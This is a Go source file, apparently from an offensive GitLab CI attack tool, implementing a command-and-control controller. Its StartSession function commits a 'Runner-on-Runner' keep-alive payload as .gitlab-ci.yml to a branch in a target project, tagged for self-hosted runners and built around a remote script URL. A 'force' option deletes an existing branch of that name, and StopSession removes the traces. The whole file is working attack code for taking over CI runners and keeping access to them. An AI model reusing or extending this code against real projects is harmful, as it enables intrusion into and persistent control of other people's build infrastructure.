package c2

import (
	"context"
	"fmt"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
)

// repo abstracts the minimal repository ops that the C2 controller needs.
// It is satisfied by attack.Attacker and by the fake used in tests.
type repo interface {
	BranchExists(ctx context.Context, projectID any, branch string) (bool, error)
	DeleteBranch(ctx context.Context, projectID any, branch string) error
	DeleteFile(ctx context.Context, projectID any, branch, path, message string) error
	CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error)
}

// Controller provides a tiny "C2" orchestration helper that stages a keep-alive
// Runner-on-Runner job via GitLab CI, and can clean it up later.
// This mirrors the Python c2_controller.py at a practical minimum.
type Controller struct{ r repo }

// NewController binds the controller to an Attacker helper.
func NewController(att *attack.Attacker) *Controller { return &Controller{r: att} }

// StartOptions holds knobs for starting a C2 session via Runner-on-Runner payload.
// It commits a .gitlab-ci.yml to a branch and returns the pipeline URL and final branch name.
//
// Deconflict supports: "fail" | "suffix" | "force" (default: suffix)
// If KeepAliveSeconds > 0 the job emits heartbeats to keep the session alive.
// If Tags are provided, they are set on the job to target self-hosted runners.
type StartOptions struct {
	ProjectID     any
	Branch        string
	CommitMessage string
	Deconflict    string
	// Payload knobs
	Tags             []string
	Image            string
	JobName          string
	Stage            string
	ArtifactsPath    string
	ArtifactsExpire  string
	Manual           bool // default true if not specified by caller
	ScriptURL        string
	TargetOS         string // linux|windows|macos
	KeepAliveSeconds int
}

// StartSession renders a runner-on-runner keep-alive payload and commits it to the target branch.
// It returns the pipeline URL, the branch actually used (after deconflict), and the YAML that was committed.
func (c *Controller) StartSession(ctx context.Context, opts StartOptions) (pipelineURL string, branchUsed string, yaml string, err error) {
	if c == nil || c.r == nil {
		return "", "", "", fmt.Errorf("nil controller")
	}
	if strings.TrimSpace(opts.Branch) == "" {
		opts.Branch = "gogatoz-c2"
	}
	strategy := strings.ToLower(strings.TrimSpace(opts.Deconflict))
	if strategy == "" {
		strategy = "suffix"
	}
	// resolve branch via deconflict
	finalBranch, err := ensureBranchName(ctx, c.r, opts.ProjectID, opts.Branch, strategy)
	if err != nil {
		return "", "", "", err
	}

	// Build payload YAML
	common := payloadgen.CommonOptions{
		JobName:         strings.TrimSpace(opts.JobName),
		Stage:           strings.TrimSpace(opts.Stage),
		Image:           strings.TrimSpace(opts.Image),
		Tags:            opts.Tags,
		Manual:          true, // default manual to true for C2 sessions
		ArtifactsPath:   strings.TrimSpace(opts.ArtifactsPath),
		ArtifactsExpire: strings.TrimSpace(opts.ArtifactsExpire),
	}
	if opts.Manual { // allow caller to force manual explicitly too
		common.Manual = true
	}
	yaml = payloadgen.GenerateRunnerOnRunnerYAML(payloadgen.RunnerOnRunnerOptions{
		Common:           common,
		ScriptURL:        strings.TrimSpace(opts.ScriptURL),
		TargetOS:         strings.TrimSpace(opts.TargetOS),
		KeepAliveSeconds: opts.KeepAliveSeconds,
	})
	if strings.TrimSpace(opts.CommitMessage) == "" {
		opts.CommitMessage = "Add C2 keep-alive pipeline via GoGatoZ"
	}
	url, err := c.r.CommitCIPipeline(ctx, opts.ProjectID, finalBranch, yaml, opts.CommitMessage)
	if err != nil {
		return "", "", "", err
	}
	return url, finalBranch, yaml, nil
}

// StopSession removes the CI file (optional) and deletes the branch used for the session.
func (c *Controller) StopSession(ctx context.Context, projectID any, branch string, removeCI bool) error {
	if c == nil || c.r == nil {
		return fmt.Errorf("nil controller")
	}
	b := strings.TrimSpace(branch)
	if b == "" {
		return fmt.Errorf("branch is required")
	}
	if removeCI {
		_ = c.r.DeleteFile(ctx, projectID, b, ".gitlab-ci.yml", "Remove C2 pipeline via GoGatoZ")
	}
	return c.r.DeleteBranch(ctx, projectID, b)
}

// ensureBranchName ensures the selected branch name based on the deconflict strategy.
func ensureBranchName(ctx context.Context, r repo, projectID any, desired, strategy string) (string, error) {
	desired = strings.TrimSpace(desired)
	if desired == "" {
		desired = "gogatoz-c2"
	}
	switch strategy {
	case "fail":
		exists, err := r.BranchExists(ctx, projectID, desired)
		if err != nil {
			return "", err
		}
		if exists {
			return "", fmt.Errorf("branch %s already exists (use deconflict)", desired)
		}
		return desired, nil
	case "force":
		exists, err := r.BranchExists(ctx, projectID, desired)
		if err != nil {
			return "", err
		}
		if exists {
			if err := r.DeleteBranch(ctx, projectID, desired); err != nil {
				return "", err
			}
		}
		return desired, nil
	case "suffix":
		exists, err := r.BranchExists(ctx, projectID, desired)
		if err != nil {
			return "", err
		}
		if !exists {
			return desired, nil
		}
		for i := 1; i <= 99; i++ {
			cand := fmt.Sprintf("%s-%d", desired, i)
			e, err := r.BranchExists(ctx, projectID, cand)
			if err != nil {
				return "", err
			}
			if !e {
				return cand, nil
			}
		}
		return "", fmt.Errorf("could not find available suffix for %s", desired)
	default:
		return "", fmt.Errorf("unknown deconflict: %s", strategy)
	}
}
